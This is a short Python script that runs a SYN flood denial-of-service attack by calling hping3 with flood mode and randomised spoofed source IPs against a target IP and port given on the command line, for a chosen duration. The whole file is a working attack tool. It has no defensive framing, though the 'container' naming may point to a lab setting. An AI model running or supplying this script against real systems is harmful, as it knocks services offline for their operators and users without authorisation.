import subprocess
import sys
import time
import shutil

def check_hping3():
    """
    Check if hping3 is available in the system
    """
    if shutil.which('hping3') is None:
        print("[!] Error: hping3 is not installed. Please install it first.")
        print("[!] On Ubuntu/Debian: sudo apt-get install hping3")
        print("[!] On CentOS/RHEL: sudo yum install hping3")
        print("[!] On Windows: Not directly available. Consider using WSL or VM")
        return False
    return True

def syn_flood_container(target_ip, target_port, duration=30):
    """
    SYN flood attack specifically targeting container using hping3
    Requires hping3 to be installed
    """
    if not check_hping3():
        return False
        
    print(f"[*] Starting Container SYN flood attack on {target_ip}:{target_port}")
    
    try:
        # Use hping3 for SYN flooding with following flags:
        # -S : SYN flag
        # -p : target port
        # --flood : send packets as fast as possible
        # --rand-source : use random source IP
        cmd = [
            "hping3",
            "-S",  # SYN flag
            "-p", str(target_port),  # target port
            "--flood",  # flood mode
            "--rand-source",  # random source IP
            target_ip  # target IP
        ]
        
        # Start the attack process
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Run for specified duration
        time.sleep(duration)
        
        # Terminate the attack
        process.terminate()
        print("[*] Attack completed")
        
    except Exception as e:
        print(f"[!] Attack failed: {str(e)}")
        return False
    
    return True

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 syn_fldContainer.py <target_ip> <target_port> <duration>")
        sys.exit(1)
        
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    syn_flood_container(target_ip, target_port, duration) 